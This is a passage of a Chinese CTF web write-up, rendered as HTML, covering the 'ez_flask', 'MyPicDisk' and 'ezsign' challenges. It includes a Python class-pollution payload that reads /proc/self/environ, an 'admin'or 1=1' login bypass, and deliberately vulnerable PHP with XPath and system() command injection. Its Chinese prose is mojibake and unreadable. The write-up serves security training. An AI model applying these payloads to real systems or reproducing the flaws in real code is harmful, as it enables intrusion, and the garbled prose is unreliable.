<span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>Users = []<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(request.data):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>            data = json.loads(request.data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>            User = user()<br>            merge(data, User)<br>            Users.append(User)<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Success&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">try</span>:<br>            data = json.loads(request.data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>            <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> Users:<br>                <span class="hljs-keyword">if</span> user.check(data):<br>                    session[<span class="hljs-string">&quot;username&quot;</span>] = data[<span class="hljs-string">&quot;username&quot;</span>]<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Success&quot;</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5010</span>)<br></code></pre></td></tr></table></figure><p><a href="https://tttang.com/archive/1876">pythonåŸå‹é“¾æ±¡æŸ“</a>ï¼Œ<code>/</code>è·¯ç”±å­˜åœ¨æ–‡ä»¶è¯»å–åŠŸèƒ½ï¼š</p><p><img src="/img/ez_flask_1.png" alt="ez_flask_1"></p><p>å¦‚æœä¸å­˜åœ¨é»‘åå•çš„è¯ç›´æ¥æ±¡æŸ“<code>__file__</code>ä¸ºç›®æ ‡æ–‡ä»¶å°±è¡Œï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__file__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/proc/self/environ&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/</code>å³å¯ï¼Œä½†è¿™é¢˜è¿‡æ»¤äº†<code>__init__</code>ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p><p><img src="/img/ez_flaks_3.png" alt="ez_flaks_3"></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p>ä¸‡èƒ½å¯†ç <code>admin&#39;or 1=1</code>ç›´æ¥ç™»å½•ï¼Œå­˜åœ¨<code>/y0u_cant_find_1t.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lasttime</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\//i&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> != <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;???&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;lasttime = <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Filename: &quot;</span>. <span class="hljs-variable language_">$this</span>-&gt;filename. <span class="hljs-string">&quot;  Last Modified Time: &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;lasttime. <span class="hljs-string">&quot;  Filesize: &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;size.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;MyPicDisk&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br>  <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;/tmp/secret.xml&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$x_query</span>=<span class="hljs-string">&quot;/accounts/user[username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$x_query</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>)==<span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span><br><span class="hljs-string">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">  &#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>      <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$filename</span>)) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;md5&quot;</span>)&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>(<span class="hljs-variable">$filename</span>);<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;remove&quot;</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;remove&quot;</span>) &#123;<br>              <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>();<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>              <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>          &#125;<br>      &#125;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php.bak</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// æ£€æŸ¥ cookie ä¸­æ˜¯å¦æœ‰ token</span><br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>)&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$token</span>);<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$token</span>, <span class="hljs-literal">true</span>);<br><br><br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$isLocal</span> = <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>        <span class="hljs-variable">$isLocal</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isLocal</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome Backï¼Œ&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-comment">//å¦‚æœ upload ç›®å½•ä¸‹å­˜åœ¨$username.pngæ–‡ä»¶ï¼Œåˆ™æ˜¾ç¤ºå›¾ç‰‡</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>            <span class="hljs-comment">// æ˜¾ç¤ºå›¾ç‰‡ï¼Œç¼©å°å›¾ç‰‡</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] .<span class="hljs-string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¯·ä¸Šä¼ æ‚¨é«˜è´µçš„å¤´åƒã€‚&#x27;</span>;<br>            <span class="hljs-comment">// å†™ä¸€ä¸ªä¸Šä¼ å¤´åƒçš„åŠŸèƒ½</span><br>            <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            EOD</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// echo &quot;ç•™ä¸ªè¨€å§&quot;;</span><br>        <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">        &lt;h1&gt;ç•™è¨€æ¿&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span><br><span class="hljs-string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span><br><span class="hljs-string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span><br><span class="hljs-string">        EOD</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;h2&gt;Login&lt;/h2&gt;</span><br><span class="hljs-string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        